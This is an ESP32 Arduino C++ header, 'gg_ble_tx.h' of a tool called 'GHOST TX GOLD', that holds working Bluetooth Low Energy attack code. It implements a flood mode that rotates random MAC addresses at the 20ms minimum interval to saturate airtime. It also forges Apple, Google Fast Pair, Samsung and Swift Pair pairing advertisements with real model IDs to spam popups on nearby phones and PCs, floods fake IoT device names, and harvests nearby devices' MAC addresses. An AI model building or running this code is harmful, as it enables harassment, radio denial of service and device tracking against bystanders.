#pragma once
// ############################################################################
//  gg_ble_tx.h  -  GHOST TX GOLD  /  BLE advertising transmission
//
//  Normal TX:  continuous advertising at the configured interval/power/channels.
//  Flood mode: rapid stop→new-MAC→restart cycling that forces the BLE
//              controller to fire fresh advertising bursts each restart,
//              and appears as many different devices on air. Combined with
//              minimum interval (20ms) this maximises BLE airtime.
// ############################################################################

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include "esp_gap_ble_api.h"
#include "esp_bt.h"
#include "gg_config.h"

static bool     ggBleTxReady     = false;
static bool     ggBleTxActive    = false;
static bool     ggBleFloodMode   = false;
static bool     ggBleSpamMode    = false;
static uint32_t ggBleTxStartMs   = 0;
static uint16_t ggBleActiveIntMs = 20;
static uint8_t  ggBleActiveCh    = GG_BC_ALL;
static esp_ble_adv_params_t ggBleAdvP;

// flood cycling state
static volatile uint32_t ggBleFloodCycles = 0;
static uint32_t ggBleFloodLastMs = 0;

static inline uint32_t ggBlePktEst() {
  if (!ggBleTxActive) return 0;
  uint32_t elapsed = millis() - ggBleTxStartMs;
  uint8_t chCount = (ggBleActiveCh == GG_BC_ALL) ? 3 : 1;
  if (ggBleFloodMode) {
    // each cycle fires one advertising event on each active channel
    return ggBleFloodCycles * chCount;
  }
  if (ggBleActiveIntMs < 1) return elapsed * chCount;
  return (elapsed / ggBleActiveIntMs) * chCount;
}

static inline void ggBleTxBegin(const GgBleTxCfg& cfg) {
  if (ggBleTxReady) {
    BLEScan* s = BLEDevice::getScan();
    if (s) { s->stop(); s->clearResults(); }
    delay(30);
  } else {
    if (ESP.getFreeHeap() < 60000) {
      return;
    }
    bool wifiWasOn = ggWifiTxRun;
    if (wifiWasOn) { ggWifiTxPaused = true; delay(30); }
    delay(200);
    BLEDevice::init("G");
    delay(100);
    ggBleTxReady = true;
    if (wifiWasOn) { ggWifiTxPaused = false; }
  }

  esp_power_level_t pwrLvl;
  if (ggBleSpamMode) {
    pwrLvl = ESP_PWR_LVL_P9;
  } else {
    switch (cfg.power) {
      case GG_BP_LOW:  pwrLvl = ESP_PWR_LVL_N12; break;
      case GG_BP_MED:  pwrLvl = ESP_PWR_LVL_N0;  break;
      case GG_BP_HIGH: pwrLvl = ESP_PWR_LVL_P6;  break;
      default:         pwrLvl = ESP_PWR_LVL_P9;   break;
    }
  }
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, pwrLvl);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, pwrLvl);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, pwrLvl);
  delay(10);

  // build advertising data
  uint8_t advRaw[31];
  int aLen = 0;
  advRaw[aLen++] = 0x02; advRaw[aLen++] = 0x01; advRaw[aLen++] = 0x06;
  int cpLen = cfg.payloadLen;
  if (cpLen + aLen + 2 > 31) cpLen = 31 - aLen - 2;
  if (cpLen > 0) {
    advRaw[aLen++] = (uint8_t)(cpLen + 1);
    advRaw[aLen++] = 0xFF;
    memcpy(&advRaw[aLen], cfg.payload, cpLen);
    aLen += cpLen;
  }
  esp_ble_gap_config_adv_data_raw(advRaw, aLen);
  delay(20);

  // advertising parameters — minimum interval for flood, configured for normal
  memset(&ggBleAdvP, 0, sizeof(ggBleAdvP));
  uint16_t intervalMs;
  if (ggBleFloodMode) {
    intervalMs = 20; // absolute minimum
  } else {
    uint8_t chCnt = (cfg.channels == GG_BC_ALL) ? 3 : 1;
    uint16_t evPerSec = cfg.pps / chCnt;
    if (evPerSec < 1) evPerSec = 1;
    intervalMs = 1000 / evPerSec;
    if (intervalMs < 20) intervalMs = 20;
    if (intervalMs > 10000) intervalMs = 10000;
  }
  uint16_t intv = (uint16_t)((intervalMs * 1000UL) / 625UL);
  if (intv < 0x20)   intv = 0x20;
  if (intv > 0x4000) intv = 0x4000;
  ggBleAdvP.adv_int_min       = intv;
  ggBleAdvP.adv_int_max       = intv;
  ggBleAdvP.adv_type          = ADV_TYPE_NONCONN_IND;
  ggBleAdvP.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
  ggBleAdvP.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

  switch (cfg.channels) {
    case GG_BC_37:  ggBleAdvP.channel_map = ADV_CHNL_37;  break;
    case GG_BC_38:  ggBleAdvP.channel_map = ADV_CHNL_38;  break;
    case GG_BC_39:  ggBleAdvP.channel_map = ADV_CHNL_39;  break;
    default:        ggBleAdvP.channel_map = ADV_CHNL_ALL;  break;
  }

  // random address + start
  esp_bd_addr_t raddr;
  for (int i = 0; i < 6; i++) raddr[i] = (uint8_t)(esp_random());
  raddr[0] = (raddr[0] | 0xC0) & 0xFE;
  esp_ble_gap_set_rand_addr(raddr);
  delay(30);

  esp_ble_gap_start_advertising(&ggBleAdvP);
  ggBleTxActive    = true;
  ggBleTxStartMs   = millis();
  ggBleActiveIntMs = intervalMs;
  ggBleActiveCh    = cfg.channels;
  ggBleFloodCycles = 0;
  ggBleFloodLastMs = millis();
}

// Flood cycling: stop adv, new random MAC, restart. Each restart fires a fresh
// advertising event burst. Called from the UI loop every ~100ms.
// Delays between GAP calls let the BLE controller finish each operation —
// without them, commands overlap and corrupt controller state.
static inline void ggBleFloodCycle() {
  if (!ggBleTxActive || !ggBleFloodMode) return;
  uint32_t now = millis();
  if (now - ggBleFloodLastMs < 30) return;
  ggBleFloodLastMs = now;
  esp_ble_gap_stop_advertising();
  delay(10);
  esp_bd_addr_t raddr;
  for (int i = 0; i < 6; i++) raddr[i] = (uint8_t)(esp_random());
  raddr[0] = (raddr[0] | 0xC0) & 0xFE;
  if (esp_ble_gap_set_rand_addr(raddr) != ESP_OK) {
    delay(10);
    esp_ble_gap_set_rand_addr(raddr);
  }
  delay(10);
  if (esp_ble_gap_start_advertising(&ggBleAdvP) == ESP_OK)
    ggBleFloodCycles++;
}

// ---- BLE multi-protocol spam system ----
// Supports multiple BLE spam protocols targeting different ecosystems.
enum GgBleSpamProto : uint8_t {
  GG_BSP_APPLE = 0,
  GG_BSP_FASTPAIR,
  GG_BSP_SAMSUNG,
  GG_BSP_SWIFTPAIR,
  GG_BSP_NAMES,
  GG_BSP_ALL,
  GG_BSP_COUNT
};
static const char* const GG_BSP_LABEL[] = { "Apple", "FastPair", "Samsung", "Swift", "Names", "All" };

static volatile uint32_t ggBleSpamCount = 0;
static uint8_t ggBleSpamProto = GG_BSP_APPLE;
static uint8_t ggBleSpamEffProto = GG_BSP_APPLE;

// ---- Apple Proximity Pairing ----
static const uint16_t GG_BLE_SPAM_MODELS[] = {
  0x0220, 0x0E20, 0x0A20, 0x1420, 0x0520, 0x0620,
  0x0920, 0x0B20, 0x0C20, 0x1020
};
static const char* const GG_BLE_SPAM_NAMES[] = {
  "AirPods", "Pods Pro", "Pods Max", "Pro 2", "Solo Pro", "Solo3",
  "Studio3", "PwrBeats", "Fit Pro", "StudioB+"
};
#define GG_BLE_SPAM_N 10

static inline void ggBleSpamSetDev(uint8_t idx) {
  uint16_t m = GG_BLE_SPAM_MODELS[idx % GG_BLE_SPAM_N];
  uint8_t raw[31] = {
    0x1E, 0xFF, 0x4C, 0x00,
    0x07, 0x19,
    0x07,
    (uint8_t)(m >> 8), (uint8_t)(m & 0xFF),
    0x55,
    0xAA, 0x30, 0x01,
    0x00, 0x00, 0x45,
    (uint8_t)(esp_random()), (uint8_t)(esp_random()), (uint8_t)(esp_random()),
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
  };
  esp_ble_gap_config_adv_data_raw(raw, 31);
}

// ---- Google Fast Pair (Android popup) ----
static const uint32_t GG_FP_MODELS[] = {
  0x2D7A23, 0xD800B3, 0x003B48, 0xF52494,
  0x718FA4, 0x1E89A7, 0x3426B6, 0x461408
};
static const char* const GG_FP_NAMES[] = {
  "PxlBdPro", "PxlBds A", "JBLLvPro", "JBL 225",
  "JBL 300", "JBL Flp5", "Sony XM4", "Pxl Buds"
};
#define GG_FP_N 8

static inline void ggBleSpamSetFastPair(uint8_t idx) {
  uint32_t m = GG_FP_MODELS[idx % GG_FP_N];
  uint8_t raw[14];
  int p = 0;
  raw[p++] = 0x02; raw[p++] = 0x01; raw[p++] = 0x06;
  raw[p++] = 0x06; raw[p++] = 0x16;
  raw[p++] = 0x2C; raw[p++] = 0xFE;
  raw[p++] = (uint8_t)((m >> 16) & 0xFF);
  raw[p++] = (uint8_t)((m >> 8) & 0xFF);
  raw[p++] = (uint8_t)(m & 0xFF);
  raw[p++] = 0x02; raw[p++] = 0x0A;
  raw[p++] = 0x00;
  esp_ble_gap_config_adv_data_raw(raw, p);
}

// ---- Samsung Galaxy Buds (Samsung popup) ----
static const uint8_t GG_SAM_MODELS[][2] = {
  {0xEA,0x01}, {0x51,0x05}, {0x40,0x09}, {0x4C,0x0B},
  {0x4E,0x11}, {0x02,0x13}, {0xC0,0x15}, {0x21,0x17}
};
static const char* const GG_SAM_NAMES[] = {
  "Gxy Buds", "Buds+", "BudsLive", "BudsPro",
  "Buds2", "Bds2Pro", "BudsFE", "Buds3"
};
#define GG_SAM_N 8

static inline void ggBleSpamSetSamsung(uint8_t idx) {
  uint8_t mi = idx % GG_SAM_N;
  uint8_t raw[25];
  int p = 0;
  raw[p++] = 0x02; raw[p++] = 0x01; raw[p++] = 0x02;
  raw[p++] = 0x15; raw[p++] = 0xFF;
  raw[p++] = 0x75; raw[p++] = 0x00;
  raw[p++] = 0x01; raw[p++] = 0x00;
  raw[p++] = 0x02; raw[p++] = 0x00;
  raw[p++] = 0x01; raw[p++] = 0x00;
  raw[p++] = GG_SAM_MODELS[mi][0];
  raw[p++] = GG_SAM_MODELS[mi][1];
  raw[p++] = 0x00; raw[p++] = 0x00;
  raw[p++] = 0x00; raw[p++] = 0x00;
  raw[p++] = 0x00; raw[p++] = 0x00;
  raw[p++] = 0x00; raw[p++] = 0x00;
  raw[p++] = 0x00; raw[p++] = 0x00;
  esp_ble_gap_config_adv_data_raw(raw, p);
}

// ---- Microsoft Swift Pair (Windows popup) ----
static inline void ggBleSpamSetSwiftPair(uint8_t idx) {
  (void)idx;
  static const char* const SP_NAMES[] = {
    "BT Mouse", "BT Keybd", "Headset", "Speaker",
    "Gamepad", "Earbuds", "Webcam", "Stylus"
  };
  const char* nm = SP_NAMES[esp_random() % 8];
  uint8_t nLen = (uint8_t)strlen(nm);
  uint8_t raw[31];
  int p = 0;
  raw[p++] = 0x02; raw[p++] = 0x01; raw[p++] = 0x06;
  raw[p++] = 0x04; raw[p++] = 0xFF;
  raw[p++] = 0x06; raw[p++] = 0x00;
  raw[p++] = 0x03;
  raw[p++] = (uint8_t)(nLen + 1);
  raw[p++] = 0x09;
  memcpy(&raw[p], nm, nLen); p += nLen;
  esp_ble_gap_config_adv_data_raw(raw, p);
}

// ---- BLE Name Flood (random device names everywhere) ----
static const char* const GG_NAME_PREFIXES[] = {
  "TV-", "Cam-", "Lock-", "Bulb-", "Plug-",
  "Hub-", "Ring-", "Echo-", "Nest-", "Hue-"
};
#define GG_NAME_PFX_N 10

static inline void ggBleSpamSetName(uint8_t idx) {
  (void)idx;
  const char* pfx = GG_NAME_PREFIXES[esp_random() % GG_NAME_PFX_N];
  char nm[16];
  uint8_t suf = (uint8_t)(esp_random());
  int nLen = snprintf(nm, sizeof(nm), "%s%02X%02X", pfx, suf, (uint8_t)(esp_random()));
  if (nLen > 15) nLen = 15;
  uint8_t raw[22];
  int p = 0;
  raw[p++] = 0x02; raw[p++] = 0x01; raw[p++] = 0x06;
  raw[p++] = (uint8_t)(nLen + 1);
  raw[p++] = 0x09;
  memcpy(&raw[p], nm, nLen); p += nLen;
  esp_ble_gap_config_adv_data_raw(raw, p);
}

// ---- Spam dispatcher: sets adv data based on active protocol ----
static inline void ggBleSpamSetAny(uint8_t idx) {
  uint8_t proto = ggBleSpamProto;
  if (proto == GG_BSP_ALL) proto = idx % 5;
  ggBleSpamEffProto = proto;
  switch (proto) {
    case GG_BSP_APPLE:     ggBleSpamSetDev(idx);       break;
    case GG_BSP_FASTPAIR:  ggBleSpamSetFastPair(idx);  break;
    case GG_BSP_SAMSUNG:   ggBleSpamSetSamsung(idx);   break;
    case GG_BSP_SWIFTPAIR: ggBleSpamSetSwiftPair(idx); break;
    case GG_BSP_NAMES:     ggBleSpamSetName(idx);      break;
    default:               ggBleSpamSetDev(idx);       break;
  }
}

static inline const char* ggBleSpamDevName(uint8_t idx) {
  uint8_t proto = ggBleSpamProto;
  if (proto == GG_BSP_ALL) proto = idx % 5;
  switch (proto) {
    case GG_BSP_APPLE:     return GG_BLE_SPAM_NAMES[idx % GG_BLE_SPAM_N];
    case GG_BSP_FASTPAIR:  return GG_FP_NAMES[idx % GG_FP_N];
    case GG_BSP_SAMSUNG:   return GG_SAM_NAMES[idx % GG_SAM_N];
    case GG_BSP_SWIFTPAIR: return "SwiftPair";
    case GG_BSP_NAMES:     return "NameFlood";
    default:               return "???";
  }
}

static inline void ggBleSpamCycle() {
  if (!ggBleTxActive || !ggBleSpamMode) return;
  uint32_t now = millis();
  if (now - ggBleFloodLastMs < 1000) return;
  ggBleFloodLastMs = now;
  esp_ble_gap_stop_advertising();
  delay(10);
  esp_bd_addr_t raddr;
  for (int i = 0; i < 6; i++) raddr[i] = (uint8_t)(esp_random());
  raddr[0] = (raddr[0] | 0xC0) & 0xFE;
  if (esp_ble_gap_set_rand_addr(raddr) != ESP_OK) {
    delay(10);
    esp_ble_gap_set_rand_addr(raddr);
  }
  delay(10);
  ggBleSpamSetAny(esp_random() & 0xFF);
  delay(20);
  ggBleAdvP.adv_type = (ggBleSpamEffProto == GG_BSP_SWIFTPAIR || ggBleSpamEffProto == GG_BSP_NAMES) ? ADV_TYPE_IND : ADV_TYPE_NONCONN_IND;
  if (esp_ble_gap_start_advertising(&ggBleAdvP) == ESP_OK)
    ggBleSpamCount++;
}

static inline void ggBleTxStop() {
  if (ggBleTxActive) {
    esp_ble_gap_stop_advertising();
    delay(20);
    ggBleTxActive = false;
  }
}

static inline void ggBleTxEnd() {
  ggBleTxStop();
  ggBleFloodMode = false;
  ggBleSpamMode = false;
  if (ggBleTxReady) {
    delay(50);
    BLEDevice::deinit(false);
    delay(100);
    ggBleTxReady = false;
  }
}

// ---- BLE device scan for picker / harvest / UUID screens ----
#define GG_BLE_PICK_MAX 16
struct GgBleDev {
  char    name[13];
  int8_t  rssi;
  uint8_t mac[6];
  uint16_t uuid16;
};
static GgBleDev ggBlePickDevs[GG_BLE_PICK_MAX];
static volatile int ggBlePickDevCount = 0;
static bool     ggBlePickDone     = false;
static uint32_t ggBlePickStartMs  = 0;

// MAC harvest: deduplicated list of unique MACs
#define GG_MAC_MAX 32
static uint8_t  ggMacList[GG_MAC_MAX][6];
static int8_t   ggMacRssi[GG_MAC_MAX];
static volatile int ggMacCount = 0;

static inline bool ggMacSeen(const uint8_t* mac) {
  for (int i = 0; i < ggMacCount; i++)
    if (memcmp(ggMacList[i], mac, 6) == 0) return true;
  return false;
}

class GgBlePickCB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) override {
    BLEAddress addr = dev.getAddress();
    const uint8_t* naddr = addr.getNative();
    // MAC harvest: always deduplicate
    if (!ggMacSeen(naddr) && ggMacCount < GG_MAC_MAX) {
      memcpy(ggMacList[ggMacCount], naddr, 6);
      ggMacRssi[ggMacCount] = (int8_t)dev.getRSSI();
      ggMacCount++;
    }
    // dedup by MAC — update RSSI for existing entries even when list is full
    for (int i = 0; i < ggBlePickDevCount; i++)
      if (memcmp(ggBlePickDevs[i].mac, naddr, 6) == 0) {
        ggBlePickDevs[i].rssi = (int8_t)dev.getRSSI();
        return;
      }
    if (ggBlePickDevCount >= GG_BLE_PICK_MAX) return;
    GgBleDev& d = ggBlePickDevs[ggBlePickDevCount];
    String nm = dev.getName();
    if (nm.length() > 0) snprintf(d.name, sizeof(d.name), "%.12s", nm.c_str());
    else strncpy(d.name, "???", sizeof(d.name));
    d.name[12] = '\0';
    d.rssi = (int8_t)dev.getRSSI();
    memcpy(d.mac, naddr, 6);
    d.uuid16 = 0;
    if (dev.haveServiceUUID()) {
      BLEUUID svcUuid = dev.getServiceUUID();
      const esp_bt_uuid_t* nu = svcUuid.getNative();
      if (nu && nu->len == ESP_UUID_LEN_16) d.uuid16 = nu->uuid.uuid16;
    }
    ggBlePickDevCount++;
  }
};
static GgBlePickCB ggBlePickCb;

static inline void ggBlePickScanBegin() {
  if (ggBleTxActive) ggBleTxStop();
  bool wifiWasOn = ggWifiTxRun;
  if (wifiWasOn) { ggWifiTxPaused = true; delay(30); }
  if (!ggBleTxReady) {
    if (ESP.getFreeHeap() < 60000) { if (wifiWasOn) ggWifiTxPaused = false; ggBlePickDone = true; return; }
    delay(100);
    BLEDevice::init("G");
    delay(50);
    ggBleTxReady = true;
  }
  if (wifiWasOn) ggWifiTxPaused = false;
  ggBlePickDevCount = 0;
  ggMacCount = 0;
  ggBlePickDone = false;
  BLEScan* scan = BLEDevice::getScan();
  if (!scan) { ggBlePickDone = true; return; }
  scan->setAdvertisedDeviceCallbacks(&ggBlePickCb, false);
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(80);
  scan->start(0, nullptr, false);
  ggBlePickStartMs = millis();
}

static inline bool ggBlePickScanPoll() {
  if (ggBlePickDone) return true;
  if (millis() - ggBlePickStartMs >= 3000) {
    BLEScan* scan = BLEDevice::getScan();
    if (scan) { scan->stop(); scan->clearResults(); }
    ggBlePickDone = true;
    return true;
  }
  return false;
}

static inline void ggBlePickScanRestart() {
  ggBlePickDone = false;
  BLEScan* scan = BLEDevice::getScan();
  if (!scan) { ggBlePickDone = true; return; }
  scan->setAdvertisedDeviceCallbacks(&ggBlePickCb, false);
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(80);
  scan->start(0, nullptr, false);
  ggBlePickStartMs = millis();
}

static inline void ggBlePickScanEnd() {
  if (!ggBlePickDone) {
    BLEScan* scan = BLEDevice::getScan();
    if (scan) { scan->stop(); scan->clearResults(); }
    ggBlePickDone = true;
  }
}
